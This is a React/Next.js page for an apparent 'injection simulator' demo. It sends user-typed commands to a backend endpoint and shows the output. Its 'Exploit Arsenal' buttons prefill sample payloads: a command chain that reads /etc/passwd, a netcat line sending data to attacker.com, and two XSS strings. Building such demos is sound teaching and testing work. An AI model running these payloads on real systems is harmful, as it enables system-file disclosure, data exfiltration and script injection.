'use client';
import { useState } from 'react';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { TerminalSquare, BugPlay, Code, FileTerminal, ArrowRight } from "lucide-react";

export default function InjectionTestPage() {
  const [cmd, setCmd] = useState('');
  const [result, setResult] = useState('');
  const [errorMsg, setErrorMsg] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);

  const handleExecute = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsExecuting(true);
    setResult('');
    setErrorMsg('');
    
    setTimeout(async () => {
      try {
        const res = await fetch('/api/command', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ cmd }),
        });
        
        const data = await res.json();
        if (res.ok) {
          setResult(data.output || 'Command executed empty result.');
        } else {
          setErrorMsg(data.error);
        }
      } catch (e) {
        setErrorMsg('Network anomaly detected. System locked or unreachable.');
      } finally {
        setIsExecuting(false);
      }
    }, 500);
  };

  const handleQuickInject = (exploit: string) => {
    setCmd(exploit);
  };

  return (
    <div className="flex flex-col items-center justify-center py-10 px-4">
      <Card className="glass-panel w-full max-w-3xl border-primary/40 relative overflow-hidden group">
        
        <div className="absolute top-0 right-0 w-32 h-32 bg-primary/5 rounded-full blur-3xl -z-10 group-hover:bg-primary/10 transition-colors duration-1000"></div>

        <CardHeader className="border-b border-primary/20 pb-5 pt-8 bg-black/40">
          <div className="flex items-center justify-between">
            <CardTitle className="text-2xl font-bold text-primary neon-text uppercase tracking-widest flex items-center gap-3">
              <TerminalSquare className="h-7 w-7" /> INJECTION_SIMULATOR
            </CardTitle>
            <div className="flex gap-2">
              <span className="w-3 h-3 rounded-full bg-red-500/50 border border-red-500"></span>
              <span className="w-3 h-3 rounded-full bg-yellow-500/50 border border-yellow-500"></span>
              <span className="w-3 h-3 rounded-full bg-primary/50 border border-primary"></span>
            </div>
          </div>
          <CardDescription className="text-primary/60 font-mono text-xs mt-3 tracking-widest uppercase">
            System Utility Diagnostic Node. Awaiting operator input...
          </CardDescription>
        </CardHeader>
        
        <CardContent className="pt-8">
          <form onSubmit={handleExecute} className="space-y-4">
            <div className="space-y-3">
              <label className="text-xs font-bold font-mono text-primary/80 uppercase tracking-widest flex items-center gap-2">
                <Code className="w-4 h-4" /> Root Execution Environment
              </label>
              
              <div className="flex flex-col sm:flex-row gap-3">
                <div className="relative flex-1 group/input">
                  <div className="absolute left-0 top-0 bottom-0 w-12 bg-primary/10 border-r border-primary/30 flex items-center justify-center text-primary font-bold z-10 rounded-l-md font-mono">
                    <FileTerminal className="w-4 h-4" />
                  </div>
                  <Input
                    type="text"
                    className="bg-black/80 border-primary/40 text-primary h-14 pl-16 focus-visible:ring-primary focus-visible:ring-offset-0 focus-visible:border-primary font-mono placeholder:text-primary/20 transition-all text-sm rounded-md shadow-[inset_0_0_15px_rgba(0,255,0,0.05)]"
                    placeholder="Enter command or injection payload..."
                    value={cmd}
                    onChange={(e) => setCmd(e.target.value)}
                    required
                  />
                </div>
                
                <Button
                  type="submit"
                  disabled={isExecuting}
                  className="h-14 px-8 font-mono font-bold uppercase tracking-widest bg-primary/15 text-primary hover:bg-primary/30 border border-primary/50 transition-all sm:w-auto w-full group/btn"
                >
                  {isExecuting ? 'Processing...' : (
                    <span className="flex items-center gap-2">
                      Execute <ArrowRight className="w-4 h-4 group-hover/btn:translate-x-1 transition-transform" />
                    </span>
                  )}
                </Button>
              </div>
            </div>
          </form>

          {(result || errorMsg) && (
            <div className="mt-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
              <Alert className={`border relative overflow-hidden flex items-start gap-4 ${errorMsg ? 'bg-[#1a0505] border-destructive/50 text-destructive shadow-[0_0_20px_rgba(255,0,0,0.15)]' : 'bg-[#001000] border-primary/50 text-primary/90 shadow-[0_0_20px_rgba(0,255,0,0.1)]'}`}>
                
                {/* Decorative side bar for alert */}
                <div className={`absolute left-0 top-0 bottom-0 w-1 ${errorMsg ? 'bg-destructive' : 'bg-primary'}`}></div>
                
                <div className={`p-2 rounded bg-black/50 border ${errorMsg ? 'border-destructive/30' : 'border-primary/30'}`}>
                   <BugPlay className={`h-5 w-5 ${errorMsg ? 'stroke-destructive' : 'stroke-primary'}`} />
                </div>
                
                <div className="flex-1">
                  <AlertTitle className="font-mono uppercase tracking-[0.2em] text-[10px] font-bold border-b border-[inherit] pb-2 mb-3 opacity-70">
                    {errorMsg ? '[! SECURITY EXCEPTION !]' : '--- STANDARD OUTPUT ---'}
                  </AlertTitle>
                  <AlertDescription className="font-mono whitespace-pre-wrap mt-2 overflow-x-auto text-sm leading-relaxed tracking-wide min-h-[60px]">
                    {errorMsg || result}
                  </AlertDescription>
                </div>
              </Alert>
            </div>
          )}
        </CardContent>

        <CardFooter className="flex flex-col items-start border-t border-primary/20 pt-6 mt-4 bg-black/40">
          <p className="font-bold mb-4 uppercase text-primary tracking-[0.2em] text-[10px] flex items-center gap-2">
             <span className="w-1.5 h-1.5 bg-primary rotate-45"></span> Exploit Arsenal
          </p>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 w-full opacity-80 text-xs font-mono text-primary/70">
            <button type="button" onClick={() => handleQuickInject('ping 8.8.8.8 && cat /etc/passwd')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
              <span><code>ping && cat /etc/passwd</code></span>
              <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
            </button>
            <button type="button" onClick={() => handleQuickInject('echo test | nc attacker.com 4444')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
              <span><code>echo | nc attacker.com</code></span>
              <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
            </button>
            <button type="button" onClick={() => handleQuickInject('<script>alert("hacked")</script>')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
              <span><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></span>
              <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
            </button>
            <button type="button" onClick={() => handleQuickInject('<img src=x onerror=alert(1)>')} className="text-left bg-primary/5 border border-primary/20 px-3 py-2 rounded hover:bg-primary/10 hover:border-primary/40 transition-colors flex items-center justify-between group/cmd">
              <span><code>&lt;img src=x onerror=...&gt;</code></span>
              <ArrowRight className="w-3 h-3 opacity-0 group-hover/cmd:opacity-100 transition-opacity" />
            </button>
          </div>
          <p className="mt-5 text-[10px] text-primary/40 font-mono tracking-widest uppercase text-center w-full">
            Any attempt to execute shell metacharacters or inject malicious scripts will trigger automated containment.
          </p>
        </CardFooter>
      </Card>
    </div>
  );
}
